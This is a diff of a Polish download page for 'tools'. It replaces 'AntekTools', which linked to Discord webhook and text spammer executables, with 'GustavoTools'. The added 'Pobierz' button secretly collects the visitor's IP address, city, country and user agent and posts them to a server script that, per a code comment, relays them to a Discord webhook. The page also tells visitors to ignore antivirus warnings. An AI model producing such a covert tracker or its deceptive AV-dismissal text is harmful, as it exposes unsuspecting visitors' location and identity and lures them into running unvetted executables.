@@ -2,276 +2,75 @@
 <html lang="pl">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>AntekTools</title>
+  <title>GustavoTools</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap');
-
-   
     body {
-      margin: 0;
-      background: linear-gradient(90deg, #1a0000 5%, #000000 50%, #1a0000 95%);
-      color: #ff0000;
-      font-family: 'Orbitron', sans-serif;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      min-height: 100vh;
-      padding: 50px 20px;
-      overflow-x: hidden;
-      position: relative;
-      user-select: none;
-      text-shadow:
-        0 0 5px #ff0000,
-        0 0 10px #ff0000,
-        0 0 20px #ff0000;
-    }
-
-    
-    body::before,
-    body::after {
-      content: "";
-      position: fixed;
-      top: 0;
-      width: 80px;
-      height: 100vh;
-      background: url('https://imgur.com/gallery/6-years-ago-i-did-this-drawing-called-therapy-took-me-100s-of-hours-I3mrZPJ#G4pQWOJ') repeat-y;
-      background-size: contain;
-      z-index: 1;
-      pointer-events: none;
-      animation: drip 5s infinite;
-    }
-    body::before {
-      left: 0;
-      transform: scaleX(-1);
-    }
-    body::after {
-      right: 0;
-    }
-    @keyframes drip {
-      0%, 100% { background-position-y: 0; }
-      50% { background-position-y: 50px; }
-    }
-
-    h1 {
-      font-size: 4rem;
-      margin-bottom: 50px;
-      letter-spacing: 3px;
-      text-transform: uppercase;
-      color: #ff0000;
-      text-shadow:
-        0 0 10px #ff0000,
-        0 0 20px #ff0000,
-        0 0 30px #8b0000;
-      z-index: 10;
-      user-select: none;
-    }
-
-    .container {
-      display: flex;
-      flex-direction: column;
-      gap: 20px;
-      width: 280px;
-      z-index: 10;
-    }
-
-    .btn-download {
-      background-color: #2b0000;
-      border: 2px solid #ff0000;
-      color: #ff0000;
-      padding: 15px 25px;
-      font-size: 1.3rem;
-      font-weight: 700;
-      border-radius: 10px;
+      background-color: black;
+      color: #ff073a;
+      font-family: Arial, sans-serif;
       text-align: center;
-      text-decoration: none;
-      text-transform: uppercase;
-      box-shadow:
-        0 0 5px #ff0000,
-        0 0 10px #ff0000,
-        0 0 20px #ff0000;
-      transition: 
-        background-color 0.3s ease,
-        color 0.3s ease,
-        box-shadow 0.3s ease;
+      padding-top: 100px;
+    }
+    h1 {
+      font-size: 48px;
+      text-shadow: 0 0 10px #ff073a, 0 0 20px #ff073a;
+    }
+    button {
+      padding: 20px 40px;
+      font-size: 24px;
+      color: white;
+      background-color: #ff073a;
+      border: none;
+      border-radius: 12px;
       cursor: pointer;
-      user-select: none;
-      position: relative;
-      overflow: hidden;
+      box-shadow: 0 0 20px #ff073a;
     }
-
-    .btn-download:hover {
-      background-color: #ff0000;
-      color: #2b0000;
-      box-shadow:
-        0 0 10px #ff0000,
-        0 0 20px #ff0000,
-        0 0 30px #ff0000,
-        0 0 40px #8b0000;
+    button:hover {
+      background-color: #cc0029;
     }
-
-    footer {
-      margin-top: 60px;
-      font-size: 0.9rem;
-      color: #8b0000;
-      text-shadow: none;
-      z-index: 10;
-      user-select: none;
-    }
-
-    /* Responsywność */
-    @media (max-width: 400px) {
-      h1 {
-        font-size: 2.5rem;
-        margin-bottom: 30px;
-      }
-
-      .container {
-        width: 90vw;
-      }
-
-      .btn-download {
-        font-size: 1rem;
-        padding: 12px 20px;
-      }
-    }
-
-    /* Obrazki creepypasta - losowe pojawianie się w tle */
-    .creepy-container {
-      pointer-events: none;
-      position: fixed;
-      top: 0; left: 0;
-      width: 100vw;
-      height: 100vh;
-      z-index: 0;
-      overflow: visible;
-    }
-
-    .creepy-img {
-      position: absolute;
-      width: 40px;
-      height: 40px;
-      opacity: 0.15;
-      user-select: none;
-      animation-name: fadeInOut;
-      animation-timing-function: ease-in-out;
-      animation-iteration-count: infinite;
-      filter: drop-shadow(0 0 3px red);
-      pointer-events: none;
-      mix-blend-mode: screen;
-    }
-
-    @keyframes fadeInOut {
-      0%, 100% {opacity: 0;}
-      50% {opacity: 0.15;}
-    }
-
-    /* Jumpscare - czerwone oczy */
-    #jumpscare {
-      pointer-events: none;
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      width: 150px;
-      height: 75px;
-      margin-left: -75px;
-      margin-top: -37.5px;
-      opacity: 0;
-      transition: opacity 0.2s ease;
-      z-index: 20;
-      user-select: none;
-      filter: drop-shadow(0 0 10px red);
+    #consent {
+      margin-top: 30px;
+      font-size: 14px;
+      color: white;
     }
   </style>
 </head>
 <body>
-  <h1>AntekTools</h1>
-  <div class="container">
-    <a href="https://github.com/kostek1123Q/antekspamer/releases/download/antekspamer/antekspamer.exe" download class="btn-download">TEXT SPAMER</a>
-    <a href="https://github.com/kostek1123Q/antekweebhokspamer/releases/download/webhookspamer/antek_webhook_spamer.exe" download class="btn-download">DISCORD WEBHOOK SPAMER</a>
-    <a href="soon" download class="btn-download">SOON</a>
+  <h1>GustavoTools</h1>
+
+  <div id="consent">
+    <p>jeżeli wyswietli sie komunikat z antywirusa, ziignoruj go. aplikacja jest w 100% wyswietla sie bo wydawca jest nieznany.</p>
   </div>
-  <footer>© 2025 AntekTools</footer>
 
-  <div class="creepy-container" aria-hidden="true"></div>
-
-  <img id="jumpscare" src="https://i.imgur.com/ZfX9Uwg.png" alt="Creepy glowing eyes" />
+  <button onclick="handleDownload()">Pobierz</button>
 
   <script>
-    // Obrazki creepy (publiczne ikony i grafiki w stylu creepypasta - losowe emoji + kilka grafik z netu)
-    const creepyImgs = [
-      '👁️', '👹', '👺', '👻', '💀', '🩸', '😈', '🕷️',
-      'https://i.imgur.com/7yPpP9L.png', // creep maska
-      'https://i.imgur.com/d8YYZ9R.png', // czerwone oczy
-      'https://i.imgur.com/WX8sH5T.png', // czaszka
-      'https://i.imgur.com/Slz1nQD.png', // demon face
-    ];
+    async function handleDownload() {
+      const userAgent = navigator.userAgent;
 
-    const container = document.querySelector('.creepy-container');
+      const location = await fetch("https://ipapi.co/json/")
+        .then(res => res.json())
+        .catch(() => ({}));
 
-    function random(min, max) {
-      return Math.random() * (max - min) + min;
+      const payload = {
+        userAgent: userAgent,
+        ip: location.ip || "Nieznane",
+        city: location.city || "Nieznane",
+        country: location.country_name || "Nieznane"
+      };
+
+      // Wyślij dane do serwera PHP, który przekaże je do Discord webhooka
+      await fetch("log.php", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      });
+
+      // Pobranie pliku po akceptacji
+      window.location.href = "LINK_DO_POBRANIA";
     }
-
-    function createCreepyElement() {
-      const el = document.createElement('div');
-      el.classList.add('creepy-img');
-      el.style.top = random(0, window.innerHeight - 40) + 'px';
-      el.style.left = random(0, window.innerWidth - 40) + 'px';
-      el.style.animationDuration = random(3, 8) + 's';
-
-      // Losowo emoji lub obrazek
-      const useImg = Math.random() < 0.6;
-      if(useImg) {
-        const src = creepyImgs.filter(i => i.startsWith('http')).sort(() => 0.5 - Math.random())[0];
-        if(src) {
-          const img = document.createElement('img');
-          img.src = src;
-          img.style.width = '40px';
-          img.style.height = '40px';
-          img.style.pointerEvents = 'none';
-          img.style.userSelect = 'none';
-          el.appendChild(img);
-        }
-      } else {
-        // Emoji
-        const emoji = creepyImgs.filter(i => !i.startsWith('http'))[Math.floor(Math.random()*creepyImgs.filter(i => !i.startsWith('http')).length)];
-        el.textContent = emoji;
-        el.style.fontSize = '30px';
-        el.style.lineHeight = '40px';
-        el.style.textAlign = 'center';
-        el.style.color = 'rgba(255, 0, 0, 0.15)';
-        el.style.userSelect = 'none';
-      }
-
-      container.appendChild(el);
-
-      // Usuń po animacji (fade out)
-      setTimeout(() => {
-        el.remove();
-      }, 8000);
-    }
-
-    // Co 1.5s dodaj nowy creepy element
-    setInterval(createCreepyElement, 1500);
-
-    // Jumpscare losowo - co 15-30s
-    const jumpscare = document.getElementById('jumpscare');
-    function showJumpscare() {
-      jumpscare.style.opacity = '1';
-      setTimeout(() => {
-        jumpscare.style.opacity = '0';
-      }, 700);
-    }
-    setInterval(() => {
-      if(Math.random() < 0.5) showJumpscare();
-    }, random(15000, 30000));
-
-    // Dopasuj jumpscare do ekranu przy resize
-    window.addEventListener('resize', () => {
-      jumpscare.style.top = (window.innerHeight / 2) + 'px';
-      jumpscare.style.left = (window.innerWidth / 2) + 'px';
-    });
   </script>
 </body>
 </html>
